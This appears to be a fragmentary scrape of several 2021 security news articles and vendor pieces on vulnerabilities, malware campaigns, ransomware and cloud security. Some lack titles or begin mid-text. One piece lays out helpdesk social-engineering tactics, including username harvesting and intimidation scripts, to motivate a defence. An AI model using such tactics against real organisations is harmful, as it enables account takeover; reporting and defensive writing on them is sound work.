'text': 'A now-patched critical vulnerability in OpenSea, the world’s largest non-fungible token (NFT) marketplace, could’ve been abused by malicious actors to drain cryptocurrency funds from a victim by sending a specially-crafted token, opening a new attack vector for exploitation.\nThe findings come from cybersecurity firm Check Point Research, which began an investigation into the platform following public reports of stolen cryptocurrency wallets triggered by free airdropped NFTs. The issues were fixed in less than one hour of responsible disclosure on September 26, 2021.\n\n“Left unpatched, the vulnerabilities could allow hackers to hijack user accounts and steal entire cryptocurrency wallets by crafting malicious NFTs,“ Check Point researchers said.\nAs the name indicates, NFTs are unique digital assets such as photos, videos, audio, and other items that can be sold and traded on the blockchain, using the technology as a certificate of authenticity to establish a verified and public proof of ownership.\n\nThe modus operandi of the attack relies on sending victims a malicious NFT that, when clicked, results in a scenario whereby rogue transactions can be facilitated through a third-party wallet provider simply by providing a wallet signature to connect their wallets and perform actions on the targets’ behalf. “Users should be hyper-aware of what they sign on OpenSea, as well as other NFT platforms, and whether it correlates with expected actions,“ the researchers said.\n\nOpenSea said it hasn’t identified any instances where this vulnerability was exploited in the wild but added it’s working with third-party wallet services to “help users better identify malicious signature requests, as well as other initiatives to help users thwart scams and phishing attacks with greater efficacy.“\n“Blockchain innovation is fast-underway and NFTs are here to stay.

{'title': '[eBook] The Guide for Reducing SaaS Applications Risk for Lean IT Security Teams',
'text': 'The Software-as-a-service (SaaS) industry has gone from novelty to an integral part of today’s business world in just a few years. While the benefits to most organizations are clear – more efficiency, greater productivity, and accessibility – the risks that the SaaS model poses are starting to become visible. It’s not an overstatement to say that most companies today run on SaaS. This poses an increasing challenge to their security teams. \nA new guide from XDR and SSPM provider Cynet, titled The Guide for Reducing SaaS Applications Risk for Lean IT Security Teams (download here), breaks down exactly why SaaS ecosystems are so risky, and how security teams can mitigate those dangers. \nToday, the average midsize company uses 185 SaaS apps. What this means is that the number of app-to-person connections has risen exponentially. Most midsize companies have nearly 4,406 touch points, creating an attack surface that requires significant resources to simply monitor. The risk of a digital disaster is impossible to ignore – especially given the security paradigms that govern most SaaS applications. \nUnderstanding SaaS Risk for Lean Security Teams\nOne of the core security issues with SaaS is that risk isn’t simply “what could go wrong“ anymore. Because SaaS applications have become so ingrained in organizations, a security breach with one could cause serious damage, and these occur frequently. They can be anything from service disruption to a large-scale data breach and create severe problems.\nThe question is, where does SaaS risk originate from? The answer is multiple places: \nThe SaaS companies themselves. Not all SaaS providers have the same security controls and attacking a SaaS provider directly can give attackers access to all their customers. This can help explain the upsurge in supply chain attacks via trusted third parties. Provider data breaches. Because of SaaS apps’ connections to organizations, they must process large volumes of data. At some point then, organizations must rely on their vendors’ security controls, which are not always up to par. Access control misconfigurations. When SaaS apps are not set up properly – either by the IT team or the vendor themselves – it opens the door for cyberattacks or user-created problems. Adverse software updates. Complex SaaS systems are tenuous enough that a bad update can create a significant disruption, opening new vulnerabilities or invalidating critical functions. Service downtime. One issue tied to the cloud-based model is that problems with a vendor will usually result in service outages for subscribers. Whether the issue is financial collapse, data center problems, or rogue staff, mission-critical services running on SaaS are at risk of being delayed, disrupted, or disabled. Insider threats. With access to so much data, a rogue staffer inside a vendor could easily misuse their access privileges for criminal purposes. \nHow can lean It Security teams manage? \nWhile this status quo creates significant challenges for lean IT security teams, it’s not the end of the world. Organizations still rely on their providers for security, but they can take steps to minimize that risk. This includes: \nVetting vendors more thoroughly and ensuring they meet your organization’s requirements and regulatory needs. Exploring the external validation and certifications a vendor holds Using external tools such as SaaS management platforms (SMP) or SaaS Security Posture Management (SSPM) that help unify and centralize security policies. \nYou can learn more about how lean IT security teams can better manage their SaaS risk here. \n\n\nFound this article interesting?

The four zero-days are as follows —\nCVE-2021-40449 (CVSS score: 7.8) - Win32k Elevation of Privilege VulnerabilityCVE-2021-41335 (CVSS score: 7.8) - Windows Kernel Elevation of Privilege VulnerabilityCVE-2021-40469 (CVSS score: 7.2) - Windows DNS Server Remote Code Execution VulnerabilityCVE-2021-41338 (CVSS score: 5.5) - Windows AppContainer Firewall Rules Security Feature Bypass Vulnerability\nAt the top of the list is CVE-2021-40449, a use-after-free vulnerability in the Win32k kernel driver discovered by Kaspersky as being exploited in the wild in late August and early September 2021 as part of a widespread espionage campaign targeting IT companies, defense contractors, and diplomatic entities. The Russian cybersecurity firm dubbed the threat cluster “MysterySnail.“\n\n“Code similarity and re-use of C2 [command-and-control] infrastructure we discovered allowed us to connect these attacks with the actor known as IronHusky and Chinese-speaking APT activity dating back to 2012,“ Kaspersky researchers Boris Larin and Costin Raiu said in a technical write-up, with the infection chains leading to the deployment of a remote access trojan capable of collecting and exfiltrating system information from compromised hosts before reaching out to its C2 server for further instructions.\nOther bugs of note include remote code execution vulnerabilities affecting Microsoft Exchange Server (CVE-2021-26427), Windows Hyper-V (CVE-2021-38672 and CVE-2021-40461), SharePoint Server (CVE-2021-40487 and CVE-2021-41344), and Microsoft Word (CVE-2021-40486) as well as an information disclosure flaw in Rich Text Edit Control (CVE-2021-40454).\nCVE-2021-26427, which has a CVSS score of 9.0 and was identified by the U.S. National Security Agency, once again underscoring that “Exchange servers are high-value targets for hackers looking to penetrate business networks,“ Bharat Jogi, senior manager of vulnerability and threat research at Qualys, said.\nThe October Patch Tuesday release is rounded out by fixes for two shortcomings newly discovered in the Print Spooler component — CVE-2021-41332 and CVE-2021-36970 — each concerning an information disclosure bug and a spoofing vulnerability, which has been tagged with an “Exploitation More Likely“ exploitability index assessment.\n\n“A spoofing vulnerability usually indicates that an attacker can impersonate or identify as another user,“ security researcher ollypwn noted in a Twitter thread. “In this case, it looks like an attacker can abuse the Spooler service to upload arbitrary files to other servers.“\nSoftware Patches From Other Vendors\nIn addition to Microsoft, patches have also been released by a number of other vendors to address several vulnerabilities, including —\nAdobeAndroidAppleCiscoCitrixIntelJuniper NetworksLinux distributions Oracle Linux, Red Hat, and SUSESAPSchneider ElectricSiemens, andVMware\n\n\nFound this article interesting?

'text': 'Code hosting platform GitHub has revoked weak SSH authentication keys that were generated via the GitKraken git GUI client due to a vulnerability in a third-party library that increased the likelihood of duplicated SSH keys.\nAs an added precautionary measure, the Microsoft-owned company also said it’s building safeguards to prevent vulnerable versions of GitKraken from adding newly generated weak keys.\n\nThe problematic dependency, called “keypair,“ is an open-source SSH key generation library that allows users to create RSA keys for authentication-related purposes. It has been found to impact GitKraken versions 7.6.x, 7.7.x, and 8.0.0, released between May 12, 2021, and September 27, 2021.\nThe flaw — tracked as CVE-2021-41117 (CVSS score: 8.7) — concerns a bug in the pseudo-random number generator used by the library, resulting in the creation of a weaker form of public SSH keys, which, owing to their low entropy — i.e., the measure of randomness — could boost the probability of key duplication.\n“This could enable an attacker to decrypt confidential messages or gain unauthorized access to an account belonging to the victim,“ keypair’s maintainer Julian Gruber said in an advisory published Monday. The issue has since been addressed in keypair version 1.0.4 and GitKraken version 8.0.1.\n\nAxosoft engineer Dan Suceava has been credited with discovering the security weakness, while GitHub security engineer Kevin Jones has been acknowledged for identifying the cause and source code location of the bug. As of writing, there’s no evidence the flaw was exploited in the wild to compromise accounts.\nAffected users are highly recommended to review and “remove all old GitKraken-generated SSH keys stored locally“ and “generate new SSH keys using GitKraken 8.0.1, or later, for each of your Git service providers“ such as GitHub, GitLab, and Bitbucket, among others.\nUpdate: Along with GitHub, Microsoft Azure DevOps, GitLab, and Atlassian Bitbucket have also initiated mass revocations of SSH keys connected to accounts where the GitKraken client was used to synchronize source code, urging users to revoke the SSH public keys and generate new keys using the updated version of the app.\n\n\nFound this article interesting?

An attacker can often get this information through a simple Google search or by querying business-oriented social networks such as LinkedIn.\nOnce an attacker identifies a user whose credentials they want to steal, they need to know the user’s login name. There are any number of ways that an attacker could figure out a login name. One method might simply be to try to authenticate into the organization’s Active Directory environment. Some older Active Directory clients will tell you if you have entered a bad username or an incorrect password.\nAn easier method is for the attacker to query online databases of leaked credentials. The attacker doesn’t necessarily need to locate the credentials for the account that they are attacking. They need only to find credentials for someone at that organization. That will reveal the username structure that the organization uses. For example, the organization might create usernames based on firstname.lastname or perhaps a first initial followed by a last name.\nWith such information in hand, the attacker might make a phone call to the organization’s helpdesk and request a password reset. The goal behind this phone call isn’t to get the password reset, but rather to find out what types of protocols the organization has in place. For example, the helpdesk technician might ask the attacker (who is posing as a legitimate employee) a security question such as, “what is your employee ID number“. The attacker can then tell the technician that they don’t have their employee ID number handy and will call back later when they have it in front of them.\nAt this point, the attacker has several crucial pieces of information in their possession. They know the victim’s name, the victim’s login name, and the security question that the helpdesk technician is going ask prior to granting a password reset.\nCombatting Social Engineering Attack With Security Questions\nUnfortunately, security questions are largely ineffective. An experienced attacker can easily acquire the answers to security questions from any number of different sources. The Dark Web for instance, contains entire databases of answers to potential security questions and we know end-users often divulge way too much personal information on social media.\nIn addition to security questions, some organizations have historically used caller ID information as a tool for verifying a user’s identity. However, this method is also unreliable because cloud-based PBX systems make it simple for an attacker to spoof caller ID information.\nThe important thing to remember is that social engineering attacks are not theoretical attack vectors, they happen in the real world. Earlier this year, Electronic Arts was infiltrated by hackers who stole a large amount of data (including source code for the company’s FIFA 21 soccer game). The hacker gained access by tricking the company’s IT support staff into giving them access to the company’s network.\nSo, if security questions and other conventional identity verification mechanisms are no longer effective, how can an organization defend itself against this sort of attack?\nOnus on the Helpdesk Technician\nThe key to preventing social engineering attacks against the helpdesk is to make it impossible for a helpdesk technician to knowingly or unknowingly aid in such an attack. The technician is, for all practical purposes, the weak link in the security chain.\nConsider the earlier example in which an attacker contacts an organization’s helpdesk pretending to be an employee who needs their password reset. Several things could conceivably happen during that conversation. Some possible outcomes include:\nThe attacker answers the security question using stollen information sourced from social media or from the Dark WebThe attacker tries to gain the technician’s trust through friendly conversation to gain favor with the technician. The attacker hopes that the technician will overlook the rules and go ahead and reset the password, even in the absence of the required security information. In some situations, the attacker might also try to make the helpdesk technician feel sorry for them.The attacker might try to intimidate the helpdesk technician by posing as a CEO who is extremely upset that they cannot log in. When the helpdesk technician asks a security question, the attacker might scream that they do not have time to answer a bunch of stupid questions, and demand that the password be reset right now (this technique has succeeded many times in the real world).\nUltimately, the technician’s discretion is the only thing that determines whether the requested password reset is going to happen. There is nothing within the native Active Directory tools that will stop a technician from being able to reset a user’s password if the technician fails to prove the user’s identity adequately. As such, the Active Directory tools can be thought of as another weak link in the security chain.\nThe Secure Solution to Socially Engineered Cyber Attack\nThe best way to eliminate the possibility that the organization will be breached by these types of attacks is to prevent the helpdesk staff from using the Active Directory Users and Computers console or similar tools for password resets. Instead, it is better to use a third-party solution such as Specops Secure Service Desk, that will physically prevent a technician from resetting a password unless certain MFA requirements have been satisfied.\nTo see how the Secure Service Desk eliminates the risks associated with password resets, consider a situation in which a legitimate user requests a password reset. The helpdesk technician can send a six-digit code to the user’s mobile device (which has been preregistered and is known to belong to the user). The technician cannot see this code and does not know what code was sent. When the user receives the code, they must read it to the technician, who then enters the code into the Specops software.\nThe admin view of an active helpdesk user verification using Specops Secure Service Desk\nOnly then is the technician allowed to reset the user’s password. This makes it impossible for the technician to skirt the rules and grant a password reset to someone who has failed to meet the security requirements.\nTest out Specops Secure Service Desk in your AD environment for free to see how it works.\n\n\nFound this article interesting?

{'title': 'Indian-Made Mobile Spyware Targeted Human Rights Activist in Togo',
'text': 'A prominent Togolese human rights defender has been targeted with spyware by a threat actor known for striking victims in South Asia, marking the hacking group’s first foray into digital surveillance in Africa.\nAmnesty International tied the covert attack campaign to a collective tracked as “Donot Team“ (aka APT-C-35), which has been linked to cyber offensives in India and Pakistan, while also identifying apparent evidence coupling the group’s infrastructure to an Indian company called Innefu Labs. The unnamed activist is believed to have targeted over a period of two months starting in December 2019 with the help of fake Android applications and spyware-loaded emails.\n“The persistent attacks over WhatsApp and email tried to trick the victim into installing a malicious application that masqueraded as a secure chat application,“ Amnesty International said in a report published last week. “The application was in fact a piece of custom Android spyware designed to extract some of the most sensitive and personal information stored on the activist’s phone.“\n\nThe messages originated from a WhatsApp account associated with an Indian phone number that’s registered in the state of Jammu and Kashmir. Once installed, the malicious software — which takes the form of an app named “ChatLite“ — grants the adversary permissions to access the camera and microphone, gather photos and files stored on the device, and even grab WhatsApp messages as they are being sent and received. \nBut when the aforementioned attempt failed, the attackers switched to an alternate infection chain in which an email sent from a Gmail account contained a malware-laced Microsoft Word document that leveraged a now-patched remote code execution vulnerability (CVE-2017-0199) to drop a full-fledged Windows spying tool known as the YTY framework that grants complete access to the victim’s machine.\n\n“The spyware can be used to steal files from the infected computer and any connected USB drives, record keystrokes, take regular screenshots of the computer, and download additional spyware components,“ the researchers said.\nAlthough Innefu Labs has not been directly implicated in the incident, Amnesty International said it discovered a domain (“server.authshieldserver.com“) that pointed to an IP address (122.160.158[.]3) used by the Delhi-based cybersecurity company. In a statement shared with the non-governmental organization, Innefu Labs denied any connection to the Donot Team APT, adding “they are not aware of any use of their IP address for the alleged activities.“\n\nWe have reached out to the company for further comment, and we will update the story if we hear back.\n“The worrying trend of private companies actively performing unlawful digital surveillance increases the scope for abuse while reducing avenues for domestic legal redress, regulation, and judicial control,“ Amnesty said. “The nature of cross-border commercial cyber surveillance where the surveillance targets, the operators, the end customer, and the attack infrastructure can all be located in different jurisdictions creates significant impediments to achieving remediation and redress for human rights abuses.“\n\n\nFound this article interesting?

{'title': 'Ransomware Group FIN12 Aggressively Going After Healthcare Targets',
'text': 'An “aggressive“ financially motivated threat actor has been identified as linked to a string of RYUK ransomware attacks since October 2018, while maintaining close partnerships with TrickBot-affiliated threat actors and using a publicly available arsenal of tools such as Cobalt Strike Beacon payloads to interact with victim networks.\nCybersecurity firm Mandiant attributed the intrusions to a Russian-speaking hacker group rechristened as FIN12, and previously tracked under the name UNC1878, with a disproportionate focus on healthcare organizations with more than $300 million in revenue, among others, including education, financial, manufacturing, and technology sectors, located in North America, Europe, and the Asia Pacific.\nThe designation marks the first time a ransomware affiliate group has been promoted to the status of a distinct threat actor.\n“FIN12 relies on partners to obtain initial access to victim environments,“ Mandiant researchers said. “Notably, instead of conducting multifaceted extortion, a tactic widely adopted by other ransomware threat actors, FIN12 appears to prioritize speed and higher revenue victims.“\n\nThe use of initial access brokers to facilitate ransomware deployments isn’t new. In June 2021, findings from enterprise security company Proofpoint revealed that ransomware actors are increasingly shifting from using email messages as an intrusion route to purchasing access from cybercriminal enterprises that have already infiltrated major entities, with Ryuk infections mainly leveraging accesses obtained via malware families like TrickBot and BazaLoader.\nFurthermore, an in-depth analysis of initial access brokers by cybersecurity firm KELA in August 2021 found that the average cost of network access was $5,400 for the period July 2020 to June 2021, with select actors adopting an ethical stance against trading access to healthcare companies. FIN12’s targeting of the healthcare sector suggests that its initial access brokers “cast a wider net and allow FIN12 actors to choose from a list of victims after accesses are already obtained.“\n\nMandiant also noted that it observed, in May 2021, threat actors obtaining a foothold in the network through phishing email campaigns distributed internally from compromised user accounts, before leading to the deployment of Cobalt Strike Beacon and WEIRDLOOP payloads. Attacks mounted between mid-February and mid-April of 2021 are said to also have taken advantage of remote logins by getting hold of credentials to victims’ Citrix environments.\nAlthough FIN12’s tactics in late 2019 involved using TrickBot as a means to maintain a foothold in the network and carry out latter-stage tasks, including reconnaissance, delivering malware droppers, and deploying the ransomware, the group has since consistently banked on Cobalt Strike Beacon payloads for performing post-exploitation activities.\n\nFIN12 also distinguishes itself from other intrusion threat actors in that it rarely engages in data theft extortion — a tactic that’s used to leak exfiltrated data when victims refuse to pay up — which Mandiant says stems from the threat actor’s desire to move quickly and strike targets that are willing to settle with minimal negotiation to recover critical systems, a factor that perhaps explains their increasing interest in attacking healthcare networks.\n“The average time to ransom (TTR) across our FIN12 engagements involving data theft was 12.4 days (12 days, 9 hours, 44 minutes) compared to 2.48 days (2 days, 11 hours, 37 minutes) where data theft was not observed,“ the researchers said. “FIN12’s apparent success without the need to incorporate additional extortion methods likely reinforces this notion.“\n“[FIN12 is the] first FIN actor that we are promoting who specializes in a specific phase of the attack lifecycle — ransomware deployment — while relying on other threat actors for gaining initial access to victims,“ Mandiant noted. “This specialization reflects the current ransomware ecosystem, which is comprised of various loosely affiliated actors partnering together, but not exclusively with one another.“\n\n\nFound this article interesting?

{'title': 'Researchers Warn of FontOnLake Rootkit Malware Targeting Linux Systems',
'text': 'Cybersecurity researchers have detailed a new campaign that likely targets entities in Southeast Asia with a previously unrecognized Linux malware that’s engineered to enable remote access to its operators, in addition to amassing credentials and function as a proxy server.\nThe malware family, dubbed “FontOnLake“ by Slovak cybersecurity firm ESET, is said to feature “well-designed modules“ that are continuously being upgraded with a broad range of abilities, indicating an active development phase. Samples uploaded to VirusTotal point to the possibility that the very first intrusions utilizing this threat have been happening as early as May 2020.\nAvast and Lacework Labs are tracking the same malware under the moniker HCRootkit.\n\n“The sneaky nature of FontOnLake’s tools in combination with advanced design and low prevalence suggest that they are used in targeted attacks,“ ESET researcher Vladislav Hrčka said. “To collect data or conduct other malicious activity, this malware family uses modified legitimate binaries that are adjusted to load further components. In fact, to conceal its existence, FontOnLake’s presence is always accompanied by a rootkit. These binaries are commonly used on Linux systems and can additionally serve as a persistence mechanism.“\nFontOnLake’s toolset includes three components that consist of trojanized versions of legitimate Linux utilities that are used to load kernel-mode rootkits and user-mode backdoors, all of which communicate with one another using virtual files. The C++-based implants themselves are designed to monitor systems, secretly execute commands on networks, and exfiltrate account credentials.\n\nA second permutation of the backdoor also comes with capabilities to act as a proxy, manipulate files, download arbitrary files, while a third variant, besides incorporating features from the other two backdoors, is equipped to execute Python scripts and shell commands.\nESET said it found two different versions of the Linux rootkit that’s based on an open-source project called Suterusu and share overlaps in functionality, including hiding processes, files, network connections, and itself, while also being able to carry out file operations, and extract and execute the user-mode backdoor.\n\nIt’s currently not known how the attackers gain initial access to the network, but the cybersecurity company noted that the threat actor behind the attacks is “overly cautious“ to avoid leaving any tracks by relying on different, unique command-and-control (C2) servers with varying non-standard ports. All the C2 servers observed in the VirusTotal artifacts are no longer active.\n“Their scale and advanced design suggest that the authors are well versed in cybersecurity and that these tools might be reused in future campaigns,“ Hrčka said. “As most of the features are designed just to hide its presence, relay communication, and provide backdoor access, we believe that these tools are used mostly to maintain an infrastructure which serves some other, unknown, malicious purposes.“\n\n\nFound this article interesting?

'text': 'The Apache Software Foundation on Thursday released additional security updates for its HTTP Server product to remediate what it says is an “incomplete fix“ for an actively exploited path traversal and remote code execution flaw that it patched earlier this week.\nCVE-2021-42013, as the new vulnerability is identified as, builds upon CVE-2021-41773, a flaw that impacts Apache web servers running version 2.4.49 and involves a path normalization bug that could enable an adversary to access and view arbitrary files stored on a vulnerable server.\n\nAlthough the flaw was addressed by the maintainers in version 2.4.50, a day after the patches were released it became known that the weakness could also be abused to gain remote code execution if the “mod_cgi“ module was loaded and the configuration “require all denied“ was absent, prompting Apache to issue another round of emergency updates.\n\n“It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives,“ the company noted in an advisory. “If files outside of these directories are not protected by the usual default configuration ’require all denied’, these requests can succeed. If CGI scripts are also enabled for these aliased paths, this could allow for remote code execution.“\n\nThe Apache Software Foundation credited Juan Escobar from Dreamlab Technologies, Fernando Muñoz from NULL Life CTF Team, and Shungo Kumasaka for reporting the vulnerability. In light of active exploitation, users are highly recommended to update to the latest version (2.4.51) to mitigate the risk associated with the flaw.\nThe U.S. Cybersecurity and Infrastructure Security Agency (CISA) said it’s “seeing ongoing scanning of vulnerable systems, which is expected to accelerate, likely leading to exploitation,“ urging “organizations to patch immediately if they haven’t already.“\n\n\nFound this article interesting?

'text': 'A high-severity code injection vulnerability has been disclosed in 23andMe’s Yamale, a schema and validator for YAML, that could be trivially exploited by adversaries to execute arbitrary Python code.\nThe flaw, tracked as CVE-2021-38305 (CVSS score: 7.8), involves manipulating the schema file provided as input to the tool to circumvent protections and achieve code execution. Particularly, the issue resides in the schema parsing function, which allows any input passed to be evaluated and executed, resulting in a scenario where a specially-crafted string within the schema can be abused for the injection of system commands.\n\nYamale is a Python package that allows developers to validate YAML — a data serialization language often used for writing configuration files — from the command line. The package is used by at least 224 repositories on GitHub. \n“This gap allows attackers that can provide an input schema file to perform Python code injection that leads to code execution with the privileges of the Yamale process,“ JFrog Security CTO Asaf Karas said in an emailed statement to The Hacker News. “We recommend sanitizing any input going to eval() extensively and — preferably — replacing eval() calls with more specific APIs required for your task.“\nFollowing responsible disclosure, the issue has been rectified in Yamale version 3.0.8. “This release fixes a bug where a well-formed schema file can execute arbitrary code on the system running Yamale,“ the maintainers of Yamale noted in the release notes published on August 4.\nThe findings are the latest in a series of security issues uncovered by JFrog in Python packages. In June 2021, Vdoo disclosed typosquatted packages in the PyPi repository that were found to download and execute third-party cryptominers such as T-Rex, ubqminer, or PhoenixMiner for mining Ethereum and Ubiq on compromised systems.\n\nSubsequently, the JFrog security team discovered eight more malicious Python libraries, which were downloaded no fewer than 30,000 times, that could have been leveraged to execute remote code on the target machine, gather system information, siphon credit card information and passwords auto-saved in Chrome and Edge browsers, and even steal Discord authentication tokens.\n“Software package repositories are becoming a popular target for supply chain attacks and there have been malware attacks on popular repositories like npm, PyPI, and RubyGems,“ the researchers said. “Sometimes malware packages are allowed to be uploaded to the package repository, giving malicious actors the opportunity to use repositories to distribute viruses and launch successful attacks on both developer and CI/CD machines in the pipeline.“\n\n\nFound this article interesting?

{'title': 'Penetration Testing Your AWS Environment - A CTO’s Guide',
'text': 'So, you’ve been thinking about getting a Penetration Test done on your Amazon Web Services (AWS) environment. Great! What should that involve exactly? \nThere are many options available, and knowing what you need will help you make your often limited security budget go as far as possible. Broadly, the key focus areas for most penetration tests involving AWS:\nYour externally accessible cloud infrastructureAny application(s) you’re building or hostingYour internal cloud infrastructureYour AWS configuration itselfSecrets management \nWe’ll look at each one, starting with the most important:\nExternal Infrastructure\nThe good news here is that, by default, AWS does its best to help you stay secure. For example, the default security groups don’t let your EC2 instances receive communication from the outside world unless you actively specify it by adding additional rules.\nThat said, AWS still allows you plenty of rope to hang yourself with if you’re not careful. Classic mistakes like engineering teams changing security groups to allow all inbound access are still a problem, and the nature of DevOps means services can be coming up and down regularly, not always with the knowledge of team managers.\nThough, there is no easier way for a hacker to compromise you than finding a simple security weakness missed in your internet-facing infrastructure, whether that’s an exposed database or software with known vulnerabilities. Attackers have the maximum payoff for the minimum effort, so the likelihood of this happening is the highest — therefore should be your first port of call to fix.\nIt can be challenging to stay on top of cloud vulnerability management due to the dynamic nature of these systems and continuous changes to your environment, with new vulnerabilities being released daily. However, modern vulnerability scanning solutions, such as Intruder, are customised to your cloud environment. You should consider using one of these tools before running a penetration test, as they help continuously manage vulnerabilities in your infrastructure with automatic scans. \nIntruder can sync targets from major cloud providers, and keep your targets sync’d when new systems are added to your cloud accounts using the CloudBot functionality. This ensures new systems are included in future vulnerability scans.\nAs it’s your most exposed attack surface, you probably wouldn’t want to remove your external infrastructure from the scope of any pen-test. And, still, you shouldn’t assign a large proportion of your budget to it if possible, and don’t expect to see many results beyond what you’ve come to expect from your vulnerability scanning tools.\nWeb Application\nMany companies use AWS to host web application(s) for customers, employees, or partners. Unfortunately, web applications, designed to be exposed by their nature, present attackers with the second easiest way into your systems - if they’re not developed securely. This makes them the second most crucial attack surface after your external infrastructure.\nExamples of such attacks include the Kaseya incident in 2021, where attackers successfully compromised Kaseya and distributed ransomware to its customers in a supply-chain attack. The right-wing social media site Gab was also compromised early in 2021 and had 70GB of sensitive user data leaked because of a SQL injection vulnerability. Going further back, the famous TalkTalk hack, a 17-year-old customer managed to find his way into their customer database and extract millions of records.\nAlways consider the impact and likelihood of an attack at this layer. Whether your application is fully accessible to the public or a limited set of customers only should factor into your decision making. For example, applications with “free trials“ would allow an attacker to sign up and start having a go. B2B services for paying customers/partners may have a lower threat profile, although still not negligible, and employees’ apps are still lower. On the other hand, some applications contain such sensitive information that the impact may seriously outweigh the likelihood.\nSo, depending on the risk profile of your application, you may find that if you can only afford penetration testers to do a few days work, this is highly likely where you should be looking to spend their time. While automated tools exist for this type of testing and can be helpful to cover the gap between penetration tests, nothing on the market today can replace the quality of a human tester who will understand the business logic of your application and look for ways to impact it.\nIntruder uses a unique algorithm to prioritise issues that leave your systems exposed, making it particularly easy to find out what presents the highest risk.\nInternal Infrastructure\nThe next layer of attack is the infrastructure where your application is built. Having covered off the external infrastructure, the internal side is only accessible if an attacker already has breached your defences somehow. So, the threat profile here is secondary to the previous two.\nOld-school penetration tests of data centres or corporate networks often revolve around gaining a foothold, then “pivoting“ from one system to another, eventually leading to full-blown compromise of administrator accounts or critical systems. Here is where AWS environments can differ from traditional penetration tests, though, as AWS networks’ software-defined nature often means tighter controls are maintained between networks, and lateral movement is a challenge. For example, once again, the default “launch-wizard-#“ security groups don’t let your EC2 instances talk to each other unless you actively specify it by adding them to a VPC or by adding additional rules. However, all but the simplest of AWS accounts get away with such simple configurations. In addition, as shown in the Capital One breach in 2019, attackers can compromise IAM role credentials and use those to access resources.\nAdditionally, the baked-in access and security controls in AWS mean that you’re far less likely to have created compromised environment-wide “administrator“ accounts via any of your EC2 instances. Instead, it’s more likely that you’re using privileged AWS accounts to do this, and so an AWS Config Review can add much more value than an “internal“ infrastructure test.\nSimilarly, while unpatched software and insecure services on internal systems can be an issue, it depends to what extent you’ve created private networks in your AWS environment and what systems can access others. It’s also worth understanding if you have a point-to-point VPN between your on-premises network and your cloud environments. If you do, an internal penetration test may be appropriate to find out whether an attacker can bridge the gap between these two networks. \nThe more complexity you have, the more an internal penetration test may add value. For example, suppose you’re running a handful of EC2’s each with their security group, or you’re using some of AWS’s shared/managed services like lambda functions - you may want to skip a traditional “internal“ penetration test and consider a config review instead.\nAWS Config\nAs mentioned, out of the box AWS does a lot for you in terms of security, but an AWS config review can tell you if you’ve set things up in a robust way.\nClassic examples of poor AWS config are the exposed S3 buckets you often hear of or a lack of multi-factor authentication to access the AWS console. But, it can also include things like admin accounts with too many users being able to access them or more complex IAM rules like how a read-only access policy may allow an attacker to gain additional privileges in your environment.\nOnce again, this can often descend into paying someone to tell you what you already know (or could easily have found out). Before you commission a penetration test, try out some free tools (a quick google throws up a variety of options). The methodology is likely the same, and you may have the answers to your questions already.\nIf you’re not confident in the security stakes or need a third-party audit for compliance reasons, it is valuable to connect with a cyber-security specialist, like Intruder, to uncover how they can help.\nSecrets Management\nSecrets management is how secrets, like access tokens, are stored and used by your people and applications. It is at the bottom of our list, but it affects all the previous areas and deserves some consideration. The AWS configuration review should include, and inform you of, how your users and services access and interact with your AWS environment, including permissions assigned to those users and services. However, this configuration review will likely only be able to assess the configuration in your AWS account, meaning in the process secrets management may be overlooked.\nDo your teams use continuous integration or continuous deployment (CI/CD)? If they do, then it’s likely that the pipeline used during the CI/CD process will have a level of integration into your AWS environments. For example, they may have to start new EC2 instances or deploy new Lambdas. How are your internal applications or services which integrate with your environment storing secrets? How are your administrators holding secrets?\nIf an attacker can get access to these secrets, they will be able to access your AWS environment and be able to escalate privileges or maintain access to the cloud environment once they’ve been cleared off your internal network.\nSo, when you’re considering a penetration test of your AWS environment, you may be interested in including the configuration of other integration systems in the scope of the test. Alternatively, you can split the process across multiple tools/assessments to focus on individual risk areas. An AWS configuration review will give you an understanding of how many things are connecting to your AWS environment using access keys and the AWS API.\nConclusion\nPenetration testing in AWS should be treated carefully, as it would be easy to spend time and money in the wrong places. AWS is a vast ecosystem, and it’s hard to cover all the ever-expanding number of services within a single point-in-time assessment, especially if you have a significant AWS presence. Sensible use of automation should always come before expensive consultancy hours, and when those are needed, they should always be used most cost-effectively. You may find that the most cost-effective way is a hybrid approach; you provide access to your AWS configuration, which can inform and guide a manual review of your complete AWS estate.\nThe Intruder Vulnerability Scanner\nIntruder is a cloud-based vulnerability scanning platform used to check for known vulnerabilities in your AWS environment to reduce your attack surface.\nIntruder offers a 30-day free trial of their platform.

'text': 'The U.S. government on Wednesday announced the formation of a new Civil Cyber-Fraud Initiative that aims to hold contractors accountable for failing to meet required cybersecurity requirements in order to safeguard public sector information and infrastructure.\n“For too long, companies have chosen silence under the mistaken belief that it is less risky to hide a breach than to bring it forward and to report it,“ said Deputy Attorney General Monaco in a press statement. “Well that changes today, [and] we will use our civil enforcement tools to pursue companies, those who are government contractors who receive federal funds, when they fail to follow required cybersecurity standards — because we know that puts all of us at risk.“\n\nThe Civil Cyber-Fraud Initiative is part of the U.S. Justice Department’s (DoJ) efforts to build resilience against cybersecurity intrusions and holding companies to task for deliberately providing deficient cybersecurity products or services, misrepresenting their cybersecurity practices or protocols, or violating their obligations to monitor and report cybersecurity incidents and breaches.\nTo that end, the government intends to utilize the False Claims Act (FCA) to go after contractors and grant recipients for cybersecurity-related fraud by failing to secure their networks and notify about security breaches adequately.\nIn addition, the DoJ also announced the launch of a National Cryptocurrency Enforcement Team (NCET) to dismantle criminal abuse of cryptocurrency platforms, particularly focusing on “crimes committed by virtual currency exchanges, mixing and tumbling services, and money laundering infrastructure actors.“\n\nThe developments also come nearly a week after the U.S. Federal Communications Commission (FCC) laid out new rules to prevent subscriber identity module (SIM) swapping scams and port-out fraud, both of which are tactics orchestrated to transfer users’ phone numbers and service to a different number and carrier under the attacker’s control.\nThe FCC’s proposal would require amending existing Customer Proprietary Network Information (CPNI) and Local Number Portability rules to mandate wireless carriers to adopt secure methods of confirming the customer’s identity before transferring their phone number to a new device or carrier. On top of that, the changes also suggest requiring providers to immediately notify customers whenever a SIM change or port request is made on their accounts.\n\n\nFound this article interesting?

